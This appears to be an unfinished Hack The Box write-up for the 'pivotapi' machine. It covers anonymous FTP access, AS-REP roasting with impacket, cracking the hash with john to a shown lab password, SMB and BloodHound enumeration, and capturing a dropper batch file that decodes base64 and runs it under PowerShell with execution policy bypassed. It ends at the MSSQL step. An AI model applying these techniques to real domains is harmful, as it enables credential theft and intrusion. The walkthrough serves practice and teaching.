# pivotapi (WIP)

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 -Pn 10.129.228.115
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-20 23:06 +08
Nmap scan report for 10.129.228.115
Host is up (0.012s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE
21/tcp    open  ftp
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
1433/tcp  open  ms-sql-s
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
9389/tcp  open  adws
49667/tcp open  unknown
49677/tcp open  unknown
49678/tcp open  unknown
49695/tcp open  unknown
49706/tcp open  unknown
```

### FTP --> AS-REP Roast

Whenever there's an FTP port open, we can check for anonymous access, and it works for this machine:

```
$ ftp 10.129.228.115
Connected to 10.129.228.115.
220 Microsoft FTP Service
Name (10.129.228.115:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||49775|)
125 Data connection already open; Transfer starting.
02-19-21  03:06PM               103106 10.1.1.414.6453.pdf
02-19-21  03:06PM               656029 28475-linux-stack-based-buffer-overflows.pdf
02-19-21  12:55PM              1802642 BHUSA09-McDonald-WindowsHeap-PAPER.pdf
02-19-21  03:06PM              1018160 ExploitingSoftware-Ch07.pdf
08-08-20  01:18PM               219091 notes1.pdf
08-08-20  01:34PM               279445 notes2.pdf
08-08-20  01:41PM                  105 README.txt
02-19-21  03:06PM              1301120 RHUL-MA-2009-06.pdf
```

There seems to be PDFs within this folder. I downloaded the `README.txt` file first.&#x20;

```
$ cat README.txt       
VERY IMPORTANT!!
Don't forget to change the download mode to binary so that the files are not corrupted.
```

Alright, we can change to binary mode and then download all of these files to our machine:

```
ftp> binary
200 Type set to I.
ftp> prompt off 
Interactive mode off.
ftp> mget *
```

I viewed all the PDFs, which didn't include anything useful. Next, we can use `exiftool` to view the metadata of each file in case there's something like a vulnerable version of PDF reader indicated. Some of them contained username fields:

```
======== notes2.pdf
ExifTool Version Number         : 12.57
File Name                       : notes2.pdf
Directory                       : .
File Size                       : 279 kB
File Modification Date/Time     : 2020:08:08 19:34:25+08:00
File Access Date/Time           : 2023:06:20 23:09:05+08:00
File Inode Change Date/Time     : 2023:06:20 23:09:05+08:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 5
XMP Toolkit                     : Image::ExifTool 12.03
Creator                         : Kaorz
Publisher                       : LicorDeBellota.htb
Producer                        : cairo 1.10.2 (http://cairographics.org)
```

I put all the usernames into a single file, and also took note of the domain used here. Here are all the users:

```
byron.gronseth
bryon_gronseth
b.gronseth
bryon_g
bryon.g
bryon
gronseth
saif
Kaorz
alex
```

The first username might need some permutation, so I included some combinations in my username list. We can then use `impacket-GetNPUsers` since we have a username list:

{% code overflow="wrap" %}
```
$ impacket-GetNPUsers -dc-ip LicorDeBellota.htb -usersfile users -outputfile hashes LicorDeBellota.htb/
$ cat hashes    
$krb5asrep$23$Kaorz@LICORDEBELLOTA.HTB:2df046b679a372879de71bc55877ee5a$af8417e1369a1eff28a23fddbb66829fc7ffea53b61ba17e1d016a6f4ed97d98e18cce9b7111a8d78d987d2e1e7b46bfb059f3c8e0006f79647044b6cc5ac9ccc034c4b9df370913173c4abe6343c12bd2cc6e06fe9051f9d7c27354932dc438cdbc853ba6f64597b400071a17a76259d9608229c6143876b520fed634d1c0dfdcda4f67c590e3413dda42c0457f7cc79245297762a556c76f242b2b62f868522ac0df5b8d252389d7c2d7b7522f6e0b3d5b9d60f89bcdfcce838e471f1a454cc95a1260c50ed1fee9e11f24faa0f1203d47f5f0ab6693deeec655fe185c9991e77fa5705a7166bbfca60a886d7346820fc183a5c576359f
```
{% endcode %}

This works! The hash can be easily cracked using `john`.&#x20;

```
$ john --wordlist=/usr/share/wordlists/rockyou.txt hashes
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Roper4155        ($krb5asrep$23$Kaorz@LICORDEBELLOTA.HTB)     
1g 0:00:00:07 DONE (2023-06-20 23:16) 0.1426g/s 1522Kp/s 1522Kc/s 1522KC/s Roryarthur..Ronald8
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

We now have credentials!&#x20;

### SMB + Bloodhound

I tried to view the shares, but we don't have access to anything special:

```
$ smbmap -u kaorz -p Roper4155 -H 10.129.228.115  
[+] IP: 10.129.228.115:445      Name: LicorDeBellota.htb                                
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Admin remota
        C$                                                      NO ACCESS       Recurso predeterminado
        IPC$                                                    READ ONLY       IPC remota
        NETLOGON                                                READ ONLY       Recurso compartido del servidor de inicio de sesión 
        SYSVOL                                                  READ ONLY       Recurso compartido del servidor de inicio de sesión
        
```

We can take a look at the shares anyway. The `NETLOGON` share contained a `HelpDesk` file:

```
$ smbclient -U 'Kaorz' //10.129.228.115/NETLOGON          
Password for [WORKGROUP\Kaorz]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Aug  8 18:42:28 2020
  ..                                  D        0  Sat Aug  8 18:42:28 2020
  HelpDesk                            D        0  Sun Aug  9 23:40:36 2020

                5158399 blocks of size 4096. 1105115 blocks available
smb: \HelpDesk\> ls
  .                                   D        0  Sun Aug  9 23:40:36 2020
  ..                                  D        0  Sun Aug  9 23:40:36 2020
  Restart-OracleService.exe           A  1854976  Fri Feb 19 18:52:01 2021
  Server MSSQL.msg                    A    24576  Sun Aug  9 19:04:14 2020
  WinRM Service.msg                   A    26112  Sun Aug  9 19:42:20 2020

                5158399 blocks of size 4096. 1105110 blocks available
```

Then, we can take a look at these files:

```
$ file Restart-OracleService.exe 
Restart-OracleService.exe: PE32+ executable (console) x86-64, for MS Windows
$ file Server\ MSSQL.msg        
Server MSSQL.msg: CDFV2 Microsoft Outlook Message
$ file WinRM\ Service.msg             
WinRM Service.msg: CDFV2 Microsoft Outlook Message
```

I transferred this to my Windows VM for some reverse engineering.&#x20;

I also used `bloodhound-python` to collect information about the domain for me. The first time I ran it, it generated this error:

```
WARNING: DCE/RPC connection failed: [Errno Connection error (pivotapi.licordebellota.htb:88)] [Errno -2] Name or service not known
INFO: Done in 00M 02
```

So we have to add another subdomain to our `/etc/hosts` file to enumerate properly. Then, we can run the command again:

```
$ bloodhound-python -d LicorDeBellota.htb -u Kaorz -p Roper4155 -c all -ns 10.129.228.115
INFO: Found AD domain: licordebellota.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: pivotapi.licordebellota.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: pivotapi.licordebellota.htb
INFO: Found 28 users
INFO: Found 58 groups
INFO: Found 3 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: PivotAPI.LicorDeBellota.htb
INFO: Done in 00M 02S
```

Afterwards, start `neo4j` and `bloodhound`. The names of the box are in Spanish, so take note of that. However, the `bloodhound` graph showcased nothing of interest for our current user and we have no privileges. When looking at all domain users, we find a `svc_mssql` user present:

<figure><img src="../../../.gitbook/assets/image (72).png" alt=""><figcaption></figcaption></figure>

The `nmap` scan earlier shows that port 1433 is indeed open. Checking this user's group memberships shows that it is part of the WinRM group, which is in turn part of the Remote Administration Group (I think).

<figure><img src="../../../.gitbook/assets/image (71).png" alt=""><figcaption></figcaption></figure>

The steps are rather clear, we need to somehow reverse engineer that `.exe` file to gain a shell as the `svc_mssql` user.&#x20;

### Reverse Engineering&#x20;

I transferred this over to my Windows VM. Running it seems to do nothing oddly:

<figure><img src="../../../.gitbook/assets/image (63).png" alt=""><figcaption></figcaption></figure>

I took a look at the logs created using Sysmon, and found some weird commands being executed. Firstly, this thing created a `.bat` file:

<figure><img src="../../../.gitbook/assets/image (64).png" alt=""><figcaption></figcaption></figure>

Afterwards, it used it ot do something else:

<figure><img src="../../../.gitbook/assets/image (68).png" alt=""><figcaption></figcaption></figure>

It also seems that this file is being destroyed by the binary after running. To catch this file, we would have to use a Powershell infinite loop that would keep checking for both directories and the `.bat` file being created, and then read the output of it.&#x20;

It was rather difficult to catch this `.bat` file for some reason, and I took a lot of runs before being able to. I used a simple Powershell loop that reads the file:

{% code overflow="wrap" %}
```powershell
Get-ChildItem -Path C:\users\user\AppData\Local\Temp\ -Recurse -Filter *.bat | ForEach-Object { copy $_.fullname .\$_name ; echo $_.name }

## in another PS shell
while ($true) { .\Restart-OracleService.exe }
```
{% endcode %}

Afterwards, I was able to copy the file and view its contents. It's rather long, so I'll truncate it a bit:

```batch
@shift /0
@echo off

if %username% == cybervaca goto correcto
if %username% == frankytech goto correcto
if %username% == ev4si0n goto correcto
goto error

:correcto
echo TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA > c:\programdata\oracle.txt
echo AAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4g >> c:\programdata\oracle.txt
<TRUNCATED>

echo $salida = $null; $fichero = (Get-Content C:\ProgramData\oracle.txt) ; foreach ($linea in $fichero) {$salida += $linea }; $salida = $salida.Replace(" ",""); [System.IO.File]::WriteAllBytes("c:\programdata\restart-service.exe", [System.Convert]::FromBase64String($salida)) > c:\programdata\monta.ps1
powershell.exe -exec bypass -file c:\programdata\monta.ps1
del c:\programdata\monta.ps1
del c:\programdata\oracle.txt
c:\programdata\restart-service.exe
del c:\programdata\restart-service.exe

:error
```

Since we have this `.bat` file, we can simply execute it after using `set` to change our username temporarily. We can also remove the `del` commands to preserve the files:

```
set username=cybervaca
.\<name>.bat
```

This would create the files that we want (after taking a few minutes). Afterwards, we would get a `monta.ps1` and a `restart-service.exe` file on our machine. Also, it detects this as raare, so make sure to include the needed exclusions from Defender.&#x20;

```
-a----         6/20/2023  11:59 PM        1746599 B811.bat
-a----         6/21/2023  12:05 AM            273 monta.ps1
-a----         6/21/2023  12:05 AM        1202440 oracle.txt
-a----         6/21/2023  12:06 AM         864768 restart-service.exe
```

Afterwards, we can reverse engineer the `restart-service.exe` file. Running it just produces this ASCII art:

```
PS C:\ProgramData> .\restart-service.exe

    ____            __             __     ____                  __
   / __ \___  _____/ /_____ ______/ /_   / __ \_________ ______/ /__
  / /_/ / _ \/ ___/ __/ __ `/ ___/ __/  / / / / ___/ __ `/ ___/ / _ \
 / _, _/  __(__  ) /_/ /_/ / /  / /_   / /_/ / /  / /_/ / /__/ /  __/
/_/ |_|\___/____/\__/\__,_/_/   \__/   \____/_/   \__,_/\___/_/\___/

                                                by @HelpDesk 2010
```

It doesn't generate any logs of interest in Sysmon, so we have to delve deeper into the processes spawned. In this case, I used API Monitor to do this. When I ran the binary within API monitor, it generated quite a lot of stuff. I disabled the filter to view everything:

<figure><img src="../../../.gitbook/assets/image (70).png" alt=""><figcaption></figcaption></figure>

I tried searching for 'Password' and found it here!

<figure><img src="../../../.gitbook/assets/image (69).png" alt=""><figcaption></figcaption></figure>

### MS-SQL Access

Now that we have creds, we can try to access the MSSQL DB and run `xp_cmdshell` on it.&#x20;

WIP!
